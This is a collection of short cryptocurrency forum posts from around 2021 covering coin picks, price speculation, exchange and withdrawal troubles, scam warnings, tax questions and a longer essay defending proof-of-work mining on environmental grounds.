Then you'll go all in. "The new paradigm". Then the bear market comes or a crash and you're left holding the bag.

Are you comfortable holding your coins for a couple of years? If you invest in blue-chip coins like BTC, ETH, Cardano, Link, Solana, Polkadot etc. most of these will continue developing in the bear market. 

Don't go all in on SafeElonDogeCum. You can get amazing gains with the normal coins. Don't chase big green candles. Stick with your investment ideas. Keep taking profits.

You can make life changing money in the next couple of months or you can lose it all. Don't listen to the people who say there won't be a bear market anymore. There will be. In May we had a 50% correction during a bull market.

**Can you hold your coins during the bear market and be fine?** Happy investing everyone!

Not sure why no one talks about this, but in the present climate where each transfer of token costs &lt; $40, this is like a gift! Holding 50 FTT allows 1 free ECR-20 withdrawal per day, which on any other exchange would easily cost $50. For a long term investor for me, by pacing my withdrawals over few days I can move out all my tokens onto my hardware wallet for zero cost. 

Just did a cost comparison, and Ive made 40 withdrawals from FTX, and on Binance this would cost me $40 * $40 per transaction = $1600 saved! Even at current FTT price, 50 tokens = around $3000, it literally pays you back the value of your investment, if you want to withdraw many tokens for long term. 

No other reward in the market even comes close.. The only other one that I can think of is NEXO offering free withdrawals for holding NEXO tokens, but they just do 3 or 4 free withdrawals a month, while FTT offers a free withdrawal a day! Almost every other exchange I've come across charges a ridiculous withdrawal fees, especially now during peak activity and soaring gas costs.

Some thoughts came to me as I was glaring and staring screens and see curves come and go.

As you all know: the price of all coins other then Bitcoin are dependent on the latter. 

Price, which I Imagine Elon and VITALIK don't really bother with. Value on the other hand...

Couldnt it be they figured that the most awsome and exlusive game would be trying to cripple eth/btc by buying and selling huge amounts of which drops prices and maybe triggering a massive selloffs wherby they litterly can count the total of  burned fake only in the game for the shortterm gain 'investors'. 

Looks like fun to me.

Alright, Im back.  After reading the comments in my original post, doing a little research, a little due diligence, I have solved what makes a NFT.

You see, NFTs are an ambiguous thing. Just because you make an NFT, it doesn't mean that you're an artist. But, also, it does mean you're an artist. But does it mean that that NFT is good? Are NFTs good just because the right people say it's good? Yes and Yes. That's how it works. 

But keep in mind, you know, a lot of modern NFTs are... trash. I mean, it's shitty. It's not... You know, it's not good. It's terrible. You know? And yet, it's a fine line between van Gogh and Van Damme, you know, between Depp and Grieco, between Banksy and Charlie, that makes it very difficult to determine what's a good NFT.

Side note, currently in the process of minting Psychedelic Cat Buttholes in Space, Collection 1, 1 of 1.  I will hold it for ten years as the demand for space Buttholes grows, and hopefully retire off the sale.  Thank you for joining my Ted Talk.

Hello everyone!

I posted this a few minutes ago, but wasnt aware that images were not allowed, therefore my post was deleted.

My portfolio looks like this:

XMR	25%

BEAM	15%

CKB	15%

ONE	10%

XTZ	15%

DOT	5%

BAT 	3%

ADA	3%

XRP	3%

SOL	3%

UNI 	3%

What am I missing here?

I tried to pick non-shit coins and did a little bit of research of every project I listed in here. Yes, I know Im not a financial expert, but Im interested in these projects and I think I did my best.

I go to school and work 1 full time &amp; 1 part time job, so I dont have that much freetime - so I might have missed something because when my friend saw my portfolio he laughed really hard and when I asked why, he told me to figure it out myself.. 

I am looking for some advice.. :(

Thank you everyone in advance!

I often read the joke that Reddit CC users eat Ramen when they're saving money or have lost a lot of money. I'm here to tell you that you're doing it wrong.

Quit Ramen. Seriously. You need to move to Couscous. What is Couscous and why should you care?

Couscous is a durum wheat semolina that you add boiling water to and wait - same as some types of Ramen.

It is very inexpensive at 1.35GBP per kilo, which reputably provides 28 servings - that's all your meals for a whole week AND only 28 boils of the kettle - so you're saving on energy costs too.

You can add minimal amounts of dried herbs to it for flavour and variety and it will genuinely taste good. Unlike your Ramen slurping, you can also enjoy eating quietly as you focus on watching the 1 second charts to make the perfect trade on ShivInu.

It is low in fat, salt and sugar but strong in vitamins and protein. One serving of couscous (-cup dry, 1 cup cooked) delivers the following nutrients, according to the USDA:

Calories: 217
Fat: 0.5g
Saturated Fat: 0g
Unsaturated Fats: 0g
Carbohydrate: 45g
Sodium: 5mg
Fiber: 3g
Protein: 7g
Sugar: 0g
Added Sugars: 0g
Magnesium: 8% DV
Calcium: 2% DV
Potassium: 2% DV
Selenium: 78% DV

Seriously, move to Couscous. You're worth it. Remember me when you become a millionaire.

A week ago Jim Cramer has predicted that Ethereum has reached its top, and might fall from its then price point.

In the following week Ethereum has rallied to a new all time high of over $4,600, making Cramer predict exactly the opposite of what has happened

He has done the same for Bitcoin, called for selling it around the $30,000 price point, in the following weeks it rallied to over $60,000

This group has done a perfect pump and dump on that coin. Im kinda sad I didnt join but glad for everyone who got some money from it. But to anyone who is reading, this is not how money is made in crypto. It is possible but not 100% working. But who am I to talk about financial stuff, I dont know shit. And just in case NFA

With all the good news surrounding Avalanche. There is no mistake that its technology alongside with good fundamentals will take Avalanche ( Avax)  in the top 5 cryptos.

Avalanche   has a market cap of 5 billion and Ethereum 's market cqp is 520 billion. So we have a lot of better chance of 4-5-6x  our money. 
Also Avalanche is burning coins with e ery transaction and iw becoming smore valuable

Avalancheis alayer one blockchainthat functions as a platform for decentralized applications and custom blockchain networks. It is one of Ethereums rivals, aiming to unseatEthereumas the most popular blockchain forsmart contracts. It aims to do so by having a higher transaction output of up to 6,500 transactions per second while not compromising scalability.

This is made possible by Avalanches unique architecture. The Avalanche network consists of three individual blockchains: the X-Chain, C-Chain and P-Chain. Each chain has a distinct purpose, which is radically different from the approach Bitcoin and Ethereum use, namely having all nodes validate all transactions. Avalanche blockchains even use different consensus mechanisms based on their use cases.

After its mainnet launch in 2020, Avalanche has worked on developing its own ecosystem ofDAppsandDeFi. Different Ethereum-based projects such as SushiSwap and TrueUSD have integrated with Avalanche. Furthermore, the platform is constantly working on improving interoperability between its own ecosystem and Ethereum, like through the development ofbridges.

Hi,
  I'm new like it states and trying to wrap my head around this new world. I like to do a lot of due diligence before I do any investing. I'm hoping some seasoned crypto people have some advice for me. In particular I've been watching an alt coin EFI for a week now. It just keeps steadily going up and is still down a fair bit from it's all time high. Is this the sort of target I should be looking at or is it likely to take a big dump soon? Any help, suggestions, tips are greatly appreciated. Please no scammers private messaging me. I'm new to crypto not new to life.

Personal opinion for myself from my perspective, not advice in any way. As always do your own research. 

Meme coins brought me into crypto. I will always be grateful for that. There are good people and good intentions within the communities but sadly there's also moats filled with deadly creatures with massive amounts of control surrounding them. People pumping have something to gain, no exceptions. People offering unbiased information with legit sources are just trying to share knowledge. Know the difference or you will learn the difference. Learn as much as you can about what you're doing, don't go in blind. Don't spend money you don't have or are not willing to lose. Know your tax implications if applicable. Ask questions, the only stupid question is the one you don't ask. 

Meme coins have incredible trading potential. I don't trade. Their markets aren't sustainable for long term in my opinion. I don't see them retaining value beyond the hype they gain, I believe they are all eventually doomed. The trouble with that train of thought is the potential for trading gains is exponential but once again I don't trade so I don't care. I don't see long term potential in them because most lack use case any live on hype and hope. Don't let Meme coins take you out. I wouldn't put anything there that I wasn't willing to lose entirely because there is no floor should the bottom fall out.

All personal opinion. Not advice in any way, shape or form.

Everyone one of us has four main stages in their crypto journey which are:

The first stage which is "CRYPTOO", in this stage you are really interested in everything in the ecosystem and you are just throwing money at every project you see and buying the news. Therefore selling low and buying high. but also regret that you sold/bought.

The second is realizing that you have done awful shit like investing without researching and having ugly projects dumping everyday and starting to realize that some research has to be done.

The third stage after doing some research and handling your shit, you manage to come up with a green portfolio that finally takes you to the green side(by hodling good projects and diversifying your risk)

The last and fourth stage is when you buy your lambo, island, helicopter, private jet, yacht and house in NY.


What stage are you at I'm stage three!

Like the title suggests i am looking for upcomming projects of crypto coins. 
Coins that arent listed anywhere and arent worth anything yet. 
Coins like PiNetwork (yes that is a scam i know) 

I am looking for these coins because i want to learn about how a company builds everything up from the creation towards the moment they come aviable on any exchange. 

I even wanna help out and maybe earn some coins along the way. 

Since these coins are worthless this is just a way for me to learn more about this world and where coins come from. 

I am fairly new to this since i started learning about crypto 2 years ago. 

I hope you can help me and maybe even others who are interested in the same thing.

Guys for the one millionth time, tech support will NEVER as for your seed phrase. If they do then its a scam 1000%

Your seed phrase has one job and that is to stay safe with you. Never share it with anyone.

The only time I shared my seed phrase was when I put my money in Vault12 for crypto inheritance in the morbid case that I die all of a sudden simply cause I cant even trust my kids with my seed phrase (theyre still very young teens).

If you ever get a message from support asking for your seed phrase, I would recommend you either block them or even better, waste a good hour of their time giving them false hope lmaooo.

The meaning behind this is even at some point in history, paper money was considered a crazy idea.

So calm down. Crypto will most definitely become a mainstream currency not too far in the future. It might take some time, but were getting there slowly.

Especially now that were seeing crypto compatible credit and debit cards like the ones from Binance and Coinbase and others that will soon be replacing Apple Pay and Venmo like CoinOvys cards.

Its a nice way of slowly converting from fiat to crypto without feeling too overwhelmed.

You know the guy that bought $8K worth of SHIB back in 2020? If he/she/it split that into 10 different wallets then there would be a much less reaction when those coins moved. 

If you bought some obscure shit coin, consider splitting it up into multiple wallets. Theyll probably be worth nothing anyway but in the off chance you strike gold, youll be able to liquidate a very large amount without startling the shit out of the market. 

Just keep this thought in the back of your subconscious. Likely this wont help anyone at all, but maybe theres a 1 in a million chance someone will find those useful

With the bull run gaining more and more momentum with each passing day, its easy to get caught up in all the hype posts on here.

Its important to stay grounded, remove your emotions and not get carried away with all the crazy gains, because we all know what happens at the end of every bull run.

Pick your targets. Values of your crypto youll be happy to leave with.

Personally, I plan to DCA out once (if) BTC reaches 85k in five 20% increments.

Yea, BTC could continue to soar well into the mid 100s and I will lose out on a lot of gains, but I will be content with the bags I never had before and begin to DCA in at discounted rates with more leverage.

Trying to time the top will more than likely set you back months.

Well fuck a duck for luck my long time not crypto hip buddy has opened a coinbase account. This is on par to the moon landing because this fucker is a massive crypto skeptic. I owe him some crypto, I always said as soon as he opens an account I'll send some crypto his way and with the amount of shit I've spouted about Ethereum its only fair I send a starting amount to him and share and explore the ways to stake it. 

With covid disrupting all manner of life events this guy used to go on regular holidays to Australia, but now thats been canned he's got a little extra money. So he's on the crypto bandwagon, lets hope ETH doesn't tank in the next few days. I'll get him to put some of his cash into ETH and stake it for an easy 5% return. Current bank deposit rates are 0.0000000fuckall so its a smart investment decision.

What about you guys? Anyone you know who's recently into crypto but in the past said no fucking way? Its encouraging to see, because there's plenty of guys like this with extra cash doing nothing for them. Also helps he knows someone that is a world class crypto enthusiast that will hold his hand through the crypto minefield.

Viewing r/Chainlink we can see the literally endless new integrations and partnerships that chainlink has. This includes the new major partnership with Associated Press to put election results, sports, world news on Chainlink. What should be a major catalyst to the practically endless potential of Chainlink as it is blockchain independent and really a middleware to the entire crypto world. LINK market cap currently sits at $14.7B with ~50% of token supply circulating, significantly lower than many other projects no where near as mature and opportunistic. What is the general consensus ? I think crypto goes through trends and right now alot of focus &amp; money is pouring into other areas. IMHO Chainlink will have its time likely in 2022 and beyond when the trends shift. Thoughts?

So, i got broke as shit and decided to cash out my moons to buy some food, i used MoonsSwap.com previously so i got there, then chose my p2p exchange for BUSD and thought it's a good idea to cut fees a bit and transfer directly to exchange's wallet.

I did set everything up right but misread the price and p2p exchange received wrong amount, being automated it means i'm not getting anything on my bank account.

I contacted support and asked what can be done about it, they couldn't proceed with transaction so i had to prove that i sent them BUSD to get it back, i couldn't, best i could do is send them link to a transaction and give evidence of me using other exchange.

They got adamant about it, everything matched, price of moons + fee on moonsswap and time of transaction, but they won't believe that BUSD was mine.

BUT here is the twist, MeLLon(creator of MoonsSwap) could be contacted via telegram easily, so i explained situation and then he just said that he can return me BUSD if this p2p exchange returns it to sender address, which they did, with money returned he sent it to me and even covered fees!

So, yeah, today i finally used my money to eat, don't be like me, send money to your wallet to have a proof that you made transaction if anything happens!

Hello, recently got into trading crypto and downloaded coinbase. It works for all the major things like advertised but not every coin is available. And also most things they list have already blown up and have have minimal gains (if I wanted 5-10% returns I would have stayed on the stock market). 

I'm looking to buy these new gaming coins but coinbase doesn't have them and because I live in Ontario, Canada binance isn't available here. 

Just wondering what you guys would suggest to do. Any help for an absolute newbie would be greatly appreciated.

Thanks in advance

Hello all,

which network do you prefer when investing in ICOs or new tokens in general?
Ethereum is always too expensive for me personally in terms of fees and I prefer Binance Smart Chain.

But I would be interested in your experiences and maybe I will learn something more this way.

Thank you

Its official! Solana is number 4 by Market Cap in the Crypto Rankings!

Congrats to all Solana bag holders! Im personally one but with a small bag. I bought in a little bit at $35 but most of it was at around $80, Im super happy with my timings! 

Hate it or like it, its good to see to something flip USDT. Next up BNB, which also isnt a good project and is heavily centralized. 

I have good hopes for Solana but honestly I doubt its going to flip ETH or BTC, but anywhere in the top 5 is good for all of its hodlers. 

What are your thoughts on Solana? Do you own a bag of it?

I recently made my first purchase of bitcoin via Moonpay. I'm using the basic Android mobile wallet. Before I made my payment I got a pop up warning from the wallet telling me to free up space or my bitcoin could be at risk. I didn't take that warning seriously, I figured bitcoin being such a highly touted, highly advanced system that something like that wouldn't be a real issue. It appears as if I was wrong because my crypto never arrived in my wallet despite moonpay saying it should've. Has anyone else encountered this and is there any way to recover my crypto?

I bought into SHIB a week ago and it has doubled my crypto balance. I got lucky on this shitcoin, but I feel like it wont go any higher because of its market cap. 

Whats the next best altcoin to put my SHIB into that has unrealised potential? Like one with great advantages but is unheard of at the moment. For example Loopring was unheard of by many people, but had astonishing low transaction fees, giving it a %100 increase the other day. Im not talking that much increase so quickly, but something that will put me in the green. 

Or where the best place is to find cryptos (news articles, Instagram page, Reddit posts)before they boom?

Hi, so like it says I'm new to crypto. I'm honestly just looking for advice. I've been watching an alt coin EFI for a week now and see a steady incline in price and it seems it has a ton of headroom to it's all time high. Should I get into it now or just stick with stuff I know?

I'm in that time of the month when I do my DCA buys.

But in the last days I didn't buy any coins.

See, everytime I buy, the market drops. So, since I didn't buy, the market is pumping. So you can all thank me for I'm the reason every coin is mooning right now. 

I've decided I'll wait a few days or weeks to buy, so you can enjoy the pump and the profits until then. Bogdanoff got his eyes on me and has his phone on hand to make everything crash once I buy. "Ze bought, dump everything".

Thanks for coming to my TED talk.

Just a few weeks ago the AnonInu community announced a release of their first play to earn game. It was set to launch next year in the second quarter but was pushed by three developers to get it done early to reward holders. 

This game will consist of staking, limited edition NFTs and potentially 10x your token holdings. You can visit their socials for visuals of the game and other announcements. 

The reason I say Twilight Zone in the title is because youll be in the virtual world of the Matrix, Squid Game and Anonymous. Good luck to all participants.

Guys, say I took out a 5k personal loan.  I can use this for whatever I want.  I understand debt is not taxable.

However, if I invest this in crypto or any other investment and I make substantial earnings...do I have to pay taxes when I sell that asset?

Scenario: I take the 5k and buy 5k in Bitcoin.  Bitcoin doubles and I'm now at 10k.  I sell 5k of that Bitcoin to pay off my personal loan.  I don't think I owe taxes on the initial 5k since loans can't be taxed...but what about the 5k of earnings I made?  If I sell that do I owe capital gains?

Hi there!

I have some SOL and LUNA (Terra) tokens in MetaMask in the Polygon Matic network Id like to put to work one way or another

Is there anyone familiar with staking SOL (Solana) on the Polygon network in any wallet I am not aware of? Maybe someone has experience with some single asset farming or vault for this token? Otherwise, can you suggest a bridge between Polygon-Solana ecosystems? Or any other idea could be very useful! 

Same question goes for LUNA tokens.. anyone familiar with interest earning on this token?

Thank you, cheers

Before we start some important abbreviations:
DEX Decentralized exchange
AMM automatic market maker

In this post I will wake you through the main AMM/DEX AKA Liquidity mining coins. The main three coins that i will be considering are ALGO, ONE, JUNO, OSMO, and ATOM.


TINYMAN
this is the least lucrative AMM compared to the other two. It offers liquidity pools of algorand based tokens(ASAs).

OPENSWAP/VIPERSWAP
These two DEXs are used for ONE liquidity mining which means that you "stake" or give your ONEs along with other assets such as Ethereum for example to provide liquidity to those DEXs in exchange you get a share of trading fees (based on your committed liquidity) and the APY of such investments on this platforms go from 30% to 850%
I know you see here high APY which means really high risks so be sure to google impermanent loss risk before choosing any of these pools.

OSMOSIS
My personal favorite liquidity mining AMM, the design and simplicity is beyond your imagination. You just need a keplr wallet and your funds there then you're all see to get some be juicy APYs that go from 60% to 650%. 

Just an observation before ending my post, choose your pools wisely, I personally choose pools that have pair of tokens that I'm bullish about so that the impermanent loss "is reduced". Last but not least don't you ever invest what you can't lose in liquidity pools. It's a really risky thing to do.

So yeah, another crypto scammer got in touch with me. I was feeling flirty. Now I'm very confused. I don't think we're on the same page. He just wants investors but I'm looking for something more meaningful. What a pity! 

Here are some screenshots of our conversation for your amusement:

&amp;#x200B;

And remember, don't trust these crypto scammers. They are easy to spot because of the new/empty accounts, flashy pictures, and the too-good-to-be-true promises. Nobody will double your money for you or help you trade better. Don't click on any links they send etc. And don't share your personal data with them.

Can we, as a community, vow to act with due diligence?

A 100x on a shitcoin is obviously attractive but I have to assume most investment in these coins is from those who already have skin in the game. 

In my opinion, every cent towards a shitcoin is liquidity that could be furthering cryptos with a genuine use case.

I wonder what the price of the blue chips would be if that liquidity were where it should be i.e. in store of value coins like btc or on dexes like thorchain, lowering slip fees and enabling greater volume trading at lower costs 

Am I wrong to think that we as a community would be seeing the same greens in our portfolios, just towards more progressive coins? And would this not in turn accelerate adoption? Long term we would clearly be better off

How do you all keep track of all your trades for tax purposes? Im planning on using pancakeswap to trade, along with coinbase and maybe kracken. Should I be tracking every trade on an excel sheet? What kind of information should I keep track of? I know that tax softwares exist but do they really do everything for me? Id imagine thered be some stuff Id have to double check and correct myself right?

&amp;#x200B;

I just wanted to get an idea of what people use to keep track of all their trades so that when tax season comes around, I wont be scrambling for information.

&amp;#x200B;

Also, if anyone is in DeFi and could give me some pointers how you keep record of all of your crypto transactions, I'd really appreciate it.

The May crash already feels so far away.
I remember the emotions when it happened and how people felt when their investment just kept going down.
Doubting themselves "did I make the right choice".
Doubting if their belief in crypto is justified.
Thinking that this crash just had to happen right when they bought.

Let this serve as a friendly reminder that everyone that bought a bag of ETH right before the crash and hodled is in the green.
Actually everyone that ever bought ETH en hodled is in the green.

You DID make the right choice
Your belief IS justified
It happened before and probably will happen again, but if you keep believing and hodling, your investment will be worth it.

Crypto is volatile, crypto can be stressful, crypto is a lot of uncertainty, but crypto is also the FUTURE.


HODL on my friends!

I hope you all are as hyped about this as I am!

Block #709632 will signal the upgrade, which with about 160 blocks mined daily at today's start of #708810, gives us just over 5 days until it goes into effect. 

One of the biggest highlights of this upgrade is the implementation of shnorr signatures, which in a nutshell will enhance privacy, scalability, security, and lower transaction fees.

Taproot will also include a new "pay-to-taproot" (P2TR) which will utilize the public key rather than its hash, creating a form of "master" signature for public keys.

This will decrease the amount of data needing to be transferred and checked, as well as increase security and privacy because the traceable transactions are somewhat harder to track.

If this all goes into effect without a hitch or major problem, I also see us testing or even exceeding ATH's not only for bitcoin, but the larger crypto community as well. And I highly doubt a major problem will surface since this has been tested so thoroughly.

I'm so happy the space continues to grow and our technology keeps evolving creating a safer and stronger decentralized network.

I have some CEL and wanted to exchange it. I deposited and started the verification progress. The progress stopped because the water utility bill isn't in english. I already contacted the support and they want me to contact a translator company which can translate my water utility bill. I simply can't withdraw or exchange it until I do this.

&amp;#x200B;

At the same time the profile page shows I can withdraw it. (false statement)

Ive been very active in this sub recently, and I dont know if theres a limit or anything on how much I can post.

But from what I have posted, the responses Ive had have actually taught me how to research for myself, and not to be greedy etc. Its really good, and I thank you guys for that.

The daily discussion is cool for highlighting the day obviously. But the amount of people hyping up coins to pump them feels kinda bad and is more like gambling at that point. Im okay with gambling if its your thing, but its not mine.

Sorry if this is common sentiment, still learning the ropes round here

 Perhaps the Crackle drama was simply too ahead of its time for 2016 audiences? Sure, but also no I think. Any of you here have been influenced by the series? Unfamiliar words and technology which personally I couldnt understand in 2016, made me briefly search for what is all this crypto about on internet. Gave up unfortunately, it was to complicated to educate myself about crypto. Not a lot of information or perhaps I didnt knew where to look and what for. Huge opportunity lost, thats for sure. Looking back now thinkingI wish I never mind. Im in now watching the charts with my crypto investment bought in May 2021 at  ATH of the mother of all highest, moving up or down +/- 0.01 % .muppet

Hey r/cc, I've got an idea for a coin that is more than just a silly website and a meme. Here's the problem: I don't have the first clue how to build a coin.

How do I go about finding the people or resources to produce the coin without giving away the idea and risking someone else stealing the idea? It isn't something that would make me an overnight millionaire but it would theoretically have some value and could generate income. 

My idea would utilize smart contracts and honestly, it may end up being more complex than it's worth, but I don't want to give away anything I don't have to. 

I don't think this would need to be a whole new Blockchain, probably a token on one of the more established chains like ETH or BNB. 

I guess the real question is where should I start with my DD to make sure I cross all my Ts and dot all my Is?

I have some CEL and wanted to exchange it. I deposited and started the verification progress. The progress stopped because the water utility bill isn't in english. I already contacted the support and they want me to contact a translator company which can translate my water utility bill. I simply can't withdraw or exchange it until I do this. 

At the same time the profile page shows I can withdraw it. (false statement)

It's not difficult to envision the NFL doing something with NFTs in the not too distant future. It's pretty much tailor made for tie-ins to the Fantasy Leagues in some way: drafting players, trading players, player icons, etc, etc. How else might this work out? What other ways might sports, sports betting, or sports gaming play out with NFTs? Player issued/certified NFTs as a means of supporting/showing fanship? Franchises doing the same? While fleshing this out at the Executive Board level for all of these sports and franchises will take some hashing out, but unless I'm missing something this is just money being left on the table.

I've tried every combination of their tools with every combination of dates. I've been trying to figure this out for over a week and so far nothing is showing up anywhere. I understand I can only search in 3 month intervals like a caveman, that is not a problem. The problem is that it isn't showing *anything* at all except my very last deposit from 2 days ago.

What the hell am I going to tell the taxman when the time comes? I haven't been tracking any of my deposits or trades on external portfoilo trackers because I assumed such an easy tool to develop wouldn't be absent from an exchange in 2021.

Any ideas? Cheers

PS: While we're on the subject, how do you guys track your portfolios? Is syncing with external apps safe or should I manually log every transaction (again) like a caveman?

The idea of crypto being horrible for the environment is unfortunately really starting to take off. There are people who hear about cryptocurrency and immediately start speaking of coal smoke stacks suffocating forests. I actually, in a way, admire those people. They are trying not to support something that they have been told uses "as much electricity as a small country" because they don't want to harm the environment. However, the reality is far more subtle than this, and the argument warrants more looking into. 

**Cryptocurrency as a Monolith**

The first point to be made here is that not all cryptocurrencies are the same. The people making the environmental argument are not blaming crypto itself, but rather a certain kind of consensus mechanism, proof of work. Proof of work is what guzzles electricity. Coins like Bitcoin and Ethereum (for now at least) force their miners collectively to use a lot of electricity to provide the network with security. Bitcoin and other such proof of work coins are the ones that use the vast majority of electricity. There are coins in existence that use other consensus mechanisms such as proof of stake. ADA is a great example of a proof of stake coin. Consequently, those coins use much less electricity. According to this (only a few months old) [CNET Article](https://www.cnet.com/personal-finance/heres-how-much-electricity-it-takes-to-mine-bitcoin-and-why-people-are-worried/), ADA uses only 6GWh per year as a network while BTC uses 126TWh (about as much as the entire country of Pakistan). 

Even *if* proof of work is responsible for killing the environment, *not all cryptocurrency is*. There are many coins that use different consensus mechanisms, slashing electricity usage by large factors. At the very least, cryptocurrency needs to stop being considered a uniform space and instead be seen as a diverse field of different technological innovations. 

**Proof of Work and the Environment**

Despite what people might think, proof of work itself is not inherently horrible for the environment either. According to this [Forbes article](https://www.forbes.com/sites/greatspeculations/2021/07/06/bitcoin-mining-uses-a-higher-mix-of-sustainable-energy-than-any-major-country-or-industry/?sh=246b0da04cc9), "total sustainable power mix \[in BTC mining\] could be as high as 56%, making Bitcoin mining one of the most sustainable industries globally."  Over half of bitcoin mining is not producing any emissions at all. What is comes down to is that Bitcoin mining or indeed any kind of proof of work mining is not inherently evil or bad for the environment. It can be done without producing any emissions. It is being done without emissions right now.

Proof of Work isn't the problem, but there is a major problem: the world's refusal to shift to renewable resources. The way electricity is being produced, not the electricity itself, is killing the environment. If the world shifted from fossil fuels to renewables, Bitcoin mining would produce zero emissions. The public anger directed at mining is displaced anger that should be directed at the use of non renewable energy in the first place. 

To drive this point home, let me provide an example. Say I have a computer that mines Ethereum 24/7 using 250 watts of electricity. At the same time, my refrigerator is running by using 400 watts. Which is worse for the environment? The environmentalist argument against cryptocurrency is based on the assumption that electricity usage is inherently bad for the environment. Thus, according to that argument, the refrigerator would be worse. There are, however, no arguments to get rid of refrigerators. This is because targeting one source of electrical usage to fix the grid as a whole is ridiculous. 

**Utility and Electricity**

Time to present a counter argument: if the world is not moving away from non renewables (which it is not in a short time scale), shouldn't we as a society be trying to optimize our electricity usage? 

There is some validity to this argument. If the world never goes renewable, then electricity usage will necessarily mean greenhouse gas emission. And yes, we *should* be more efficient with our electricity. But in practice, making our electricity usage efficient is easier said than done. 

Imagine a world in which leaders come together to limit electrical consumption rather than shift to renewables. What is considered worthwhile electrical usage? Facebook, according to [Statista](https://www.statista.com/statistics/580087/energy-use-of-facebook/), used over 5 TWh of electricity in 2019 as a company. The Ethereum network that year used around 8TWh according to [digiconomist](https://digiconomist.net/ethereum-energy-consumption/) (although Eth electricity usage has since gone up significantly). Is Facebook or Ethereum a better usage of electricity? Is Web2.0 more valuable than Web3.0 to spend electricity on? Those are questions that are impossible to answer. This does not even mention the fact that public policymakers would neither have the cooperation skills nor knowledge necessary to make informed, good decisions about humanity's future electricity usage. Even if the lawmakers decided how people should use electricity, good luck enforcing it. 

In other words, a world that does not use renewable resources will not practically be able to optimize its electricity usage. To optimize electricity usage would require public policymakers to decide what is the best form of electricity usage, which is an impossible thing to define. If we don't switch to renewables, we are screwed whether crypto mining is stopped or not. If we do switch, the mining debate becomes irrelevant because renewables will be used, and emissions will drop. 

To reiterate, *proof of work is not the problem, it is the symptom of the problem*. If we don't solve the problem and only solve the symptom by stopping mining, there will be very little impact on the world's emissions and humanity's sustainability. We will be screwed anyway. 

**Conclusion**

Even though proof of work is not inherently bad for the environment, *crypto is still moving toward more electrically efficient means, as many of the biggest currencies are now proof of stake.* Look no further than Ethereum shifting to proof of stake to see this for yourself. So if you are of the mindset that the world needs to optimize its electricity, many cryptocurrencies have already optimized themselves. And if you are still angry that proof of work coins are using so much energy, turn your anger to the real issue at play here: the world's refusal to shift to renewable resources. That is an issue we should all be passionate about. 

**TL;DR:** People think crypto bad for environment because use too much electricity. Many cryptos use less already bc of Proof of Stake. Proof of Work coins use renewable resources to a large extent already. Instead of focusing on Proof of Work coins' emissions, the solution is to fix on the electrical grid as a whole to use renewable resources; if the electrical grid is not fixed, the planet is screwed anyway.

 Many people, myself included, are regretting not starting with investing earlier in cryptospace mainly in bigger coins. But I was wondering, what was the first time you even heard about cryptocurrencies being a thing?

I first heard about crypto from a colleague of mine in uni in mid 2010. It was during the class break when he told me over coffee that he found out about this new kind of money that is going to get popular. I didn't really believe him on the "get popular" part but I was interested. He even tried shilling it to me so I'd buy a few ten of them with my lunch money. I went and bought myself a doner kebab that day instead of 10 BTC.

We have seen a lot of posts about upcoming DOT parachain auctions. I will not go into detail about this since you can find a lot of good information in other posts on this sub.

What I would like to know is the sentiment on this sub about the possible options for DOT holders.

First option is to hodl, do nothing and continue with the usual DCA. 

Second option is to get out of DOT somewhere at the top. Estimates for the top go from $60 to $100+

Third option is to participate in crowloaning. This would mean getting your DOT locked for two years and reaping rewards from the projects that win the auctions. If you choose this, which projects are you going to support?

Last option is if you don't have any DOT atm.

I know it seems very counterintuitive but most of the time there are coordinated efforts to drive prices down before a big pump. 

Example: Ethereum earlier this year had a ton of fud "ADA and DOT Ethereum killers blah blah". And it's true that as these articles and influencers all over the internet were FUDing Eth, it did bleed for a bit against those "eth killers". But you know what happened next? Eth went absolutely parabolic and created an ATH while those "killers" went silent. 

Don't sell out of coins just because of influencer and Reddit FUD. Most these people have no idea what they are talking about (myself included). In certain situations it may be valid, but have some conviction in your holdings because if you let emotions get ahold of you, you will 100% get rekt. 

Things to look at: 
Your alt/BTC chart - is it in a general uptrend and approaching what could be a bottom/support area? If so, this is generally a good time to buy. 

Your alt/Eth chart - is it in a general macro uptrend? If it's been bleeding against Eth for years, you may want to reconsider holding it over Eth. 

Good luck and wen moon

So I was having a glance at the charts for when the great bull run of 2017-18 peaked. 

On Jan 10th 2018, the entire market cap reached a total of $773 billion before we went into a long gruelling crypto winter. By December 2018, the marketcap was barely over $100 billion.

Fast forward to now and we stand on the brink of a $3 trillion market, that's 30x from the lows of late 2018-early 2019.

Like most of you, I've been amazed at some of the parabolic runs we've seen in 2021 (SOL, ADA, MATIC, SHIB, DOGE, SOL just to name a few). But this is nothing compared to what I think the future holds. Who's to say that we won't have a $20 to $30 trillion dollar market in 2025 with BTC and ETH holding the lions share, which would mean BTC finally overtakes gold in total marketcap. Maybe ETH decides to do the same just for shits and gigs.

Now, let's take the total world wealth, I'll go with [this](https://www.forbes.com/sites/oliverwilliams1/2021/06/10/worlds-wealth-hits-half-a-quadrillion-dollars/?sh=972aee8309dc) article from Forbes that gave an estimate of $431 trillion, which includes financial wealth and real assets, net of liabilities. 

 $3 trillion is ONLY 0.69% of that total figure. So based off this, I believe that we are still very early as crypto investors in how much the market will grow following mainstream adoption by governments and companies. 

Call it hopium if you wish but long term I expect the market to head towards the $100 trillion level over the next 10 years. At that point, I believe crypto will have become fully mainstream and as integral to our world as the Internet is today.

NFA by the way, this is just my opinion based off the marketcap we've seen from the peak of the last bull cycle to its low and where we are now, which is a hell of a run.

What do you think?

So, few weeks ago a colleague who never invested in crypto said he read somewhere that Shiba is the new Bitcoin. At that time, he didn't even know what Shiba or bitcoin mean. He had no crypto wallets, he was just making a random conversation about something he read online.

I made the mistake of telling him that I invest in crypto and that Shiba is a shitcoin.

Everything ended up there.

A week ago he read the news about the guy who invested 8k in Shiba and became rich and he automatically decided that now he would be a billionaire and he's not just because of me.

I never told him to not invest in Shiba, I just expressed my opinion. He never really wanted to invest in any crypto. However, even if he invested in Shiba a month ago, now he wouldn't be rich at all. But he's too illiterate to understand it.

Since then, he started to say that I made him lose millions and I should help him to recover (?!)

I just told him I'm not a trader and I don't give any financial advice. I really don't trade. I just buy the crypto I like and hold.

Since then, he started to text me everyday about any possible crypto and asking me if he should buy it. I always answer that I don't know it.

He thinks I'm just selfish and I don't want to help him because I want to be the only one to become rich.

He became very annoying so I blocked him in every social and I told him to not bother me anymore. So he just started to send me emails in my work account where I can't block him because he's a colleague.

Few days ago he sent an email without any text, in the subject it was written "shibazzilla: should I buy it?"
I didn't answer him.

Now he told me he lost everything invested in shibazilla and he said it's my fault because I didn't warn him.

